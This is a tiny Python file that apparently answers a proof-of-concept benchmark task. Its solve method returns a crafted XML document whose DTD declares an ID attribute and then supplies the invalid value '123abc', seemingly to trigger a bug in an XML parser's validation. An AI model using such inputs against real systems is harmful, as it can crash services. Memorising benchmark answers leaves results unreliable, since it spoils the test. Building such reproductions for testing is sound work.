class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root EMPTY>
<!ATTLIST root invalid_attr ID #REQUIRED>
]>
<root invalid_attr="123abc"/>
"""
        return poc
